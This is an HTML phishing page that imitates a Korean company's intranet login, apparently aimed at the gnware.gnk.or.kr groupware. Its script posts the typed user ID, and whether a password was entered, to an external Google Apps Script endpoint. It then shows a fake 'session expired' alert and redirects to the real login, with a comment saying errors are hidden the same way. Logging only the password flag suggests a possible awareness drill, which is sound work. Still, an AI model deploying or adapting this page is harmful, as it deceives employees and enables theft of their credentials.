<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>사내 인트라넷 로그인</title>
    <style>
        body { 
            font-family: 'Malgun Gothic', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: flex-start; 
            padding-top: 20vh; 
            min-height: 100vh; 
            background-color: #ffffff; 
            margin: 0; 
            box-sizing: border-box;
        }
        .login-container {
            width: 380px;
            padding: 40px;
            border: 1px solid #e0e0e0;
            background-color: #ffffff;
            text-align: center;
        }
        .logo-area {
            margin-bottom: 30px;
            font-size: 24px;
            font-weight: bold;
            color: #333;
        }
        input[type="text"], input[type="password"] { 
            width: 100%; 
            padding: 14px; 
            margin-bottom: 10px; 
            border: 1px solid #333; 
            background-color: #e8f0fe; 
            box-sizing: border-box;
            font-size: 14px;
        }
        button { 
            width: 100%; 
            padding: 14px; 
            background-color: #009ebf; 
            color: white; 
            border: none; 
            cursor: pointer; 
            font-size: 15px; 
            font-weight: bold;
            margin-bottom: 15px;
        }
        button:hover { background-color: #00819c; }
        .options {
            display: flex;
            justify-content: flex-start;
            align-items: center;
            font-size: 12px;
            color: #666;
        }
        .options input { margin-right: 5px; }
    </style>
</head>
<body>

    <div class="login-container">
        
        <div class="logo-area">
            <img src="https://gnware.gnk.or.kr/thumb/original/5183723-3899" alt="로고" style="max-width: 100%; height: auto;">
        </div>
        
        <form id="phishingForm">
            <input type="text" id="userId" placeholder="아이디를 입력하세요" required>
            <input type="password" id="userPw" placeholder="비밀번호" required>
            <button type="submit">로그인</button>
            
            <div class="options">
                <input type="checkbox" id="saveId"> <label for="saveId">계정 저장</label>
            </div>
        </form>
    </div>

    <script>
        document.getElementById('phishingForm').addEventListener('submit', function(e) {
            e.preventDefault(); 

            var userId = document.getElementById('userId').value;
            var userPw = document.getElementById('userPw').value;
            var isPwEntered = userPw.length > 0 ? 'O' : 'X';
            
            // ★ 전에 발급받은 구글 앱스 스크립트 웹 앱 URL을 반드시 여기에 다시 넣어줘! ★
            var gasUrl = 'https://script.google.com/macros/s/AKfycbxx3xoV30Fq8UB4bCDtSLXRwsWkFOEjt-fm2cw9w7mqufJCTN6THnQCUnBRhhwgAHAgKA/exec';

            var formData = new FormData();
            formData.append('userId', userId);
            formData.append('isPwEntered', isPwEntered);

            fetch(gasUrl, {
                method: 'POST',
                mode: 'no-cors', 
                body: formData
            }).then(() => {
                // 전송 성공 시 멘트 및 실제 그룹웨어로 튕겨내기
                alert('세션이 만료되었습니다. 그룹웨어로 돌아갑니다.');
                window.location.href = 'https://gnware.gnk.or.kr/login';
            }).catch(error => {
                // 만약 에러가 나더라도 티 안 나게 똑같이 처리
                alert('세션이 만료되었습니다. 그룹웨어로 돌아갑니다.');
                window.location.href = 'https://gnware.gnk.or.kr/login';
            });
        });
    </script>

</body>
</html>
